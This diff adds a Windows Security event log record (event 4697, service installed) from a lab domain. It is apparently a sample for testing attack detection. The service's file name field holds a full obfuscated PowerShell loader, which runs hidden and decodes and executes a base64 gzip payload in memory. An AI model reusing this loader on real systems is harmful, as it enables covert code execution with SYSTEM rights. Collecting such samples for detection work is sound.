@@ -1,0 +1,31 @@
+<root>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
+      <EventID>4697</EventID>
+      <Version>0</Version>
+      <Level>0</Level>
+      <Task>12289</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8020000000000000</Keywords>
+      <TimeCreated SystemTime="2021-04-21T14:56:43.234146800Z" />
+      <EventRecordID>354577</EventRecordID>
+      <Correlation ActivityID="{42422748-35ed-0000-6027-4242ed35d701}" />
+      <Execution ProcessID="584" ThreadID="5408" />
+      <Channel>Security</Channel>
+      <Computer>srvdefender01.offsec.lan</Computer>
+      <Security />
+    </System>
+    <EventData>
+      <Data Name="SubjectUserSid">S-1-5-21-4230534742-2542757381-3142984815-1111</Data>
+      <Data Name="SubjectUserName">admmig</Data>
+      <Data Name="SubjectDomainName">OFFSEC</Data>
+      <Data Name="SubjectLogonId">0x1659379</Data>
+      <Data Name="ServiceName">iOWamcEn</Data>
+      <Data Name="ServiceFileName">%COMSPEC% /b /c start /b /min powershell.exe -nop -w hidden -noni -c "if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-noni -nop -w hidden -c &amp;([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(''H4sIAPU7gGACA7VW+2/aSBD+OZHyP1gVErZKsHlcEyJVurUdHk0gBof3odNiL/Y2ay+xFwjp9X+/WbDbVE3v2pPO4rGPmdmZb76d8WoTe4LyWBG1Zah8Ojs9cXCCI0UtPH5YlZQCtWhLOzmB9ULwUXmvqHO0Xts8wjReXF1ZmyQhsTjOyy0iUJqSaMkoSVVN+UsZhyQh53fLj8QTyiel8Ge5xfgSs0xsb2EvJMo5in25d8s9LH0pu2tGhVr844+iNj+vLMrXjxvMUrXo7lNBorLPWFFTPmvywPv9mqjFLvUSnvKVKI9pXKuWh3GKV6QH1rakS0TI/bSoQQzwSYjYJLEC0Uj146ZahKGTcA/5fkLStFhS5tLwfLH4XZ1npw42saARKXdiQRK+dkmypR5Jy20c+4wMyGoBWq5IaBwsNA3EtvyBqIV4w1hJ+RUzao/scsx+Vkl9qQRSjki0EiTxuyi73N8wctQrvuKmTLsGT556QO3z2enZ6SrnCd42ti95AqOT+WFMwDfV4Sk9yL1XjJLShXOw4MkepoX7ZEO0xRdklUJqL0s/Vq/ksiD53DD2EazNR5z6C9DJkll4vJSrP6akTVY0JvY+xhH1ctapryFMVowcIiznYj3wSS1mG8S3CSMBFhI1mejv1K4jKr7omhvKfJIgD7KUgleQQO1bZ46JUIuduEsiQOg4B+YVVsB1kktn/N7np8s5CBUthtO0pDgbuGxeSXEJZsQvKShOabaFNoIfhsWv7nY3TFAPpyI3t9COKGanWTxORbLxIGUQ+b27Jh7FTAJRUtrUJ+bepUF+avFVGCzMGFwBsLSFNMCKDN8VkggJOCiTrpVdIjrRmpEIRA5XvslwABc84/mBODggfvFb93IeH0krYcjjf+Ec5NZlXJSUEU0E1A0J6YE//+nwFxUD3LASkuVAzS/G3NwLSedC0AieJRkzSA4AJAKCbyY8MnFK3tWP1UF9o99RB8EztdvurCPcLnztTsxopTPsri4dYfCI1jq861mp02peIroLdt5lD3n+B580XJDrU6NziXzrtt8OJ6FnGveoDWvBdNgR0w5q34ceMxy7rbvT1KC79ljaOtrw6vX2xEC1Wv2uZjwAblNaCR6Q34vo7ukWxlAG727NTmoaHXb9wRosx9XmbMzaer0ZrsY8dd9NbV3XGz62u3uETO7XuvtJZcDv215k1mOuN6z6A7pGyIqvR02T30zNBDn6CAdrboX+hVUNLIRaF5TM+sOm2e83TTRsfXy0G3qgN8YTHJrjUZXO1pNBCPPmrt2/0Y16xyfPfLYD4Foc4WAAMoFV9cIVyNhvkfm2x9MqfjA5MkGmOXtErXC6bjoM9u+HVY5GrDfB6Ha2b+p6ZerUUdvg41aA+iCOA7OPUbq1n229MvK5P/6tN13powm70G2r74QTGbO+juTvrm3feLPKzru7qJvGoxXRiC2rvt4YXprx7iZwtoHfH18Mnnr7JZw71PXRG8kmoFPBC8d+5QVRflTbuzhJQ8yAQFC28/va5Ekzq8QOp1JDVQ+d+4EkMWHQ+qA55sxHjHFPtoFDzYYWdGwMsk8NYVirvjrSlC+C2tcGkS9dXc3AS7hKku7lWxIHIiwZTzXDgHJvPNUNCPPnI7P4eq8eTJVkuzhikxtnB+OavGSFVMTx/4tZdrVD+PP/DbOva/+w+1M4GqUs5u/Wv134JVR/OfYxpgIkXShOjBz74usQZAx58d4gEwP5X2WPfOm724jzHrxOnJ3+DTnHlctdCgAA''))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);"</Data>
+      <Data Name="ServiceType">0x10</Data>
+      <Data Name="ServiceStartType">3</Data>
+      <Data Name="ServiceAccount">LocalSystem</Data>
+    </EventData>
+  </Event>
+</root>
